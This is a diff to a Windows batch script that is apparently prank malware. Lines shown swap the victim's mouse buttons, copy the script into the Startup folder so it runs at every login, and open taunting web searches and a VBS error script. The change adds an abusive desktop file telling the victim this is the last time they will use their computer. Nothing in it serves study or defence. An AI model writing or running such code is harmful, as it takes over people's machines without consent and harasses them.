@@ -1,6 +1,7 @@
 @echo off
 cls
 
+ping localhost -n 6 >NUL
 Rundll32 user32, SwapMouseButton
 
 copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"
@@ -66,7 +67,15 @@ start https://www.google.com/search?q=GET+DESTROYED+BITCH!+HAHAHA
 start runerrors.vbs
 
 ping localhost -n 10 >NUL
-start notepad.exe
+
+
+echo LOLOOLOLOL!>>"%userprofile%\Desktop\FUCKED.txt"
+echo You were Jebaited too!!! HAHAHA>>"%userprofile%\Desktop\FUCKED.txt"
+echo Have fun, using your computer the last time! LMAOOO>>"%userprofile%\Desktop\FUCKED.txt"
+
+cd %userprofile%\Desktop
+start FUCKED.txt
+
 
 cd "%userprofile%/Desktop"
 
